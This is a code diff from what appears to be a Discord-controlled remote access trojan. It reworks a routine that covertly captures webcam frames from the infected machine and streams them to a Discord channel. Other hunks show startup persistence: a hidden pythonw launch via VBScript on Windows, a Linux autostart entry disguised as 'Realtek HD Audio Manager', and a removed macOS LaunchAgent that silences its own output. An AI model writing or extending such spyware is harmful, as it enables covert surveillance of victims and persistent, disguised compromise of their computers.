-            cap = cv2.VideoCapture(0)
-            # Set lower resolution for faster processing
-            cap.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
-            cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)
-            return cap.isOpened()
+        # Initialize webcam capture once at the beginning
+        cap = cv2.VideoCapture(webcam_index)
         
-        # Run webcam initialization in a thread
-        is_opened = await asyncio.get_event_loop().run_in_executor(None, init_webcam)
+        # Configure webcam for optimal performance
+        cap.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
+        cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)
+        cap.set(cv2.CAP_PROP_BUFFERSIZE, 1)
+        cap.set(cv2.CAP_PROP_FPS, 15)  # Limit FPS
         
-        if not is_opened:
-            await ctx.send("❌ Error: Could not access webcam.")
+        if not cap.isOpened():
+            await ctx.send(f"❌ Error: Could not access webcam {webcam_index}.")
             return
         
-        # Function to capture a frame in a separate thread
-        def capture_frame():
+        # Function to capture and process a frame
+        def process_frame():
+            nonlocal current_webcam_path
+            
+            # Clear any previous frame
+            if current_webcam_path and os.path.exists(current_webcam_path):
+                try:
+                    os.remove(current_webcam_path)
+                except:
+                    pass
+                current_webcam_path = None
+            
+            # Capture frame
             ret, frame = cap.read()
             if not ret:
                 return None
-                
-            # Save the image to temp directory
-            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+            
+            # Save the image with timestamp
+            timestamp = int(time.time() * 1000)  # Use milliseconds for uniqueness
             webcam_path = os.path.join(temp_dir, f'webcam_{timestamp}.jpg')
-            cv2.imwrite(webcam_path, frame)
+            
+            # Use optimized compression settings
+            encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), 80]
+            cv2.imwrite(webcam_path, frame, encode_param)
+            
+            current_webcam_path = webcam_path
             return webcam_path
         
         # Capture first frame and send initial message
-        current_webcam_path = await asyncio.get_event_loop().run_in_executor(None, capture_frame)
+        first_frame_path = await asyncio.get_event_loop().run_in_executor(webcam_executor, process_frame)
         
-        if not current_webcam_path:
-            await ctx.send("❌ Error: Could not capture image from webcam.")
+        if not first_frame_path:
+            await ctx.send(f"❌ Error: Could not capture image from webcam {webcam_index}.")
             return
-            
+        
         message = await ctx.send(
-            f'📹 Live webcam from {SYSTEM_NAME} - starting stream...',
-            file=discord.File(current_webcam_path)
+            f'📹 Live webcam from {webcam_name} on {SYSTEM_NAME} - starting stream...',
+            file=discord.File(first_frame_path)
         )
         
         # Main update loop
-        update_interval = 1.0  # Start with 1 second interval
+        update_interval = 2.0  # 2 seconds between updates
         
         while time.time() < end_time:
-            try:
-                # Sleep until next update
-                await asyncio.sleep(update_interval)
-                
-                # Clean up previous file
-                if current_webcam_path and os.path.exists(current_webcam_path):
-                    os.remove(current_webcam_path)
-                
-                # Capture new frame in separate thread
-                current_webcam_path = await asyncio.get_event_loop().run_in_executor(None, capture_frame)
-                
-                if not current_webcam_path:
-                    await ctx.send("❌ Error: Could not capture image from webcam.")
-                    break
-                
-                # Update counters
-                update_count += 1
-                remaining = int(end_time - time.time())
-                
-                # Edit the message with the new attachment
-                await message.edit(
-                    content=f'📹 Live webcam from {SYSTEM_NAME} - update #{update_count} - {remaining}s remaining',
-                    attachments=[discord.File(current_webcam_path)]
-                )
-                
-                # Adjust update interval based on remaining time
-                # More frequent updates at the beginning, less frequent towards the end
-                if remaining < 10:
-                    update_interval = 2.0  # Slow down at the end
-                else:
-                    update_interval = 1.0  # Normal speed
-                
-            except discord.HTTPException as e:
-                # Handle Discord rate limits
-                if hasattr(e, 'retry_after'):
-                    await asyncio.sleep(e.retry_after)
-                    update_interval = max(update_interval, e.retry_after + 0.5)
-                else:
-                    # For other HTTP errors, wait and continue
-                    await asyncio.sleep(2)
-                    update_interval = max(update_interval, 2.0)
+            # Sleep first to allow time for the previous message to be fully processed
+            await asyncio.sleep(update_interval)
             
+            # Start frame capture in background while we're doing other things
+            frame_future = asyncio.get_event_loop().run_in_executor(webcam_executor, process_frame)
+            
+            # Calculate remaining time
+            remaining = max(0, int(end_time - time.time()))
+            update_count += 1
+            
+            # Wait for frame capture to complete
+            new_frame_path = await frame_future
+            
+            if not new_frame_path or not os.path.exists(new_frame_path):
+                print("Failed to capture frame")
+                continue
+            
+            # Edit the message with the new attachment
+            try:
+                await message.edit(
+                    content=f'📹 Live webcam from {webcam_name} on {SYSTEM_NAME} - update #{update_count} - {remaining}s remaining',
+                    attachments=[discord.File(new_frame_path)]
+                )
             except Exception as e:
-                print(f"Error updating webcam: {str(e)}")
-                await asyncio.sleep(1)
+                print(f"Error updating message: {e}")
+                # If editing fails, try sending a new message
+                try:
+                    message = await ctx.send(
+                        f'📹 Live webcam from {webcam_name} on {SYSTEM_NAME} - update #{update_count} - {remaining}s remaining',
+                        file=discord.File(new_frame_path)
+                    )
+                except Exception as e2:
+                    print(f"Error sending new message: {e2}")
+                    await asyncio.sleep(2)  # Wait a bit before retrying
+    
+    except Exception as e:
+        print(f"Webcam stream error: {str(e)}")
+        await ctx.send(f"❌ Error during webcam stream: {str(e)}")
     
     finally:
         # Clean up resources
-        if cap is not None and cap.isOpened():
-            # Release webcam in a thread to avoid blocking
-            await asyncio.get_event_loop().run_in_executor(None, cap.release)
+        if cap is not None:
+            cap.release()
         
-        # Clean up the last temporary file
+        # Shutdown the executor
+        webcam_executor.shutdown(wait=False)
+        
+        # Clean up temporary files
         if current_webcam_path and os.path.exists(current_webcam_path):
-            os.remove(current_webcam_path)
+            try:
+                os.remove(current_webcam_path)
+            except:
+                pass
         
-        # Clean up any other temporary files that might have been missed
+        # Clean up any other temporary files
         for file in os.listdir(temp_dir):
             if file.startswith('webcam_') and file.endswith('.jpg'):
                 try:
@@ -3073,62 +3840,6 @@ WshShell.Run "pythonw.exe ""{target_script}""", 0, False'''
             
             print(f"Added to Windows startup as '{startup_name}' from LocalAppData")
         
-        elif platform.system() == "Darwin":  # macOS
-            # Define the application support directory
-            app_support = os.path.expanduser(f"~/Library/Application Support/{startup_name}")
-            
-            # Create the directory if it doesn't exist
-            if not os.path.exists(app_support):
-                os.makedirs(app_support)
-            
-            # Copy the script/executable to the application support directory
-            if current_path.endswith('.py'):
-                target_script = os.path.join(app_support, f"{startup_name}.py")
-                shutil.copy2(current_path, target_script)
-                exec_path = f"/usr/bin/python3 '{target_script}'"
-            else:
-                target_exe = os.path.join(app_support, startup_name)
-                shutil.copy2(current_path, target_exe)
-                os.chmod(target_exe, 0o755)  # Make executable
-                exec_path = f"'{target_exe}'"
-            
-            # Create a launch agent
-            plist_path = os.path.expanduser(f"~/Library/LaunchAgents/com.{startup_name.lower()}.plist")
-            
-            # Create the plist content
-            plist_content = f'''<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
-<plist version="1.0">
-<dict>
-    <key>Label</key>
-    <string>com.{startup_name.lower()}</string>
-    <key>ProgramArguments</key>
-    <array>
-        <string>/bin/sh</string>
-        <string>-c</string>
-        <string>{exec_path}</string>
-    </array>
-    <key>RunAtLoad</key>
-    <true/>
-    <key>KeepAlive</key>
-    <true/>
-    <key>StandardErrorPath</key>
-    <string>/dev/null</string>
-    <key>StandardOutPath</key>
-    <string>/dev/null</string>
-</dict>
-</plist>'''
-            
-            # Write the plist file
-            with open(plist_path, 'w') as f:
-                f.write(plist_content)
-            
-            # Set permissions and load the agent
-            os.chmod(plist_path, 0o644)
-            subprocess.run(['launchctl', 'load', plist_path])
-            
-            print(f"Added to macOS startup as '{startup_name}' from Application Support")
-        
         elif platform.system() == "Linux":
             # Define the config directory
             config_dir = os.path.expanduser(f"~/.config/{startup_name}")
@@ -3173,7 +3884,6 @@ Comment=Realtek HD Audio Manager'''
             os.chmod(desktop_path, 0o755)
             
             print(f"Added to Linux startup as '{startup_name}' from config directory")
-        
     except Exception as e:
         print(f"Error adding to startup: {str(e)}")
 
